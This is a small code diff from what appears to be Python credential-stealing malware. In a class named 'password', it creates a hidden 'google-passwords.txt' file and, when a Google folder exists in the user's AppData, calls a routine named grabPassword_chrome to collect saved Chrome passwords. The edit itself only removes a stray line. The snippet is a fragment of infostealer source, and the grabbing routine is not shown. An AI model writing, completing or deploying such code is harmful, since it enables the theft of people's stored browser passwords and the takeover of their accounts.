@@ -277,7 +277,6 @@ class password():
 		with open("google-passwords.txt", "w") as f:
 			f.write("Cortés Family /// Google Chrome Passwords\n\n")
 		hide(".\\google-passwords.txt")
-		Cortés Family
 		if os.path.exists(self.appdata+'\\Google'):
 			self.grabPassword_chrome() 
 		
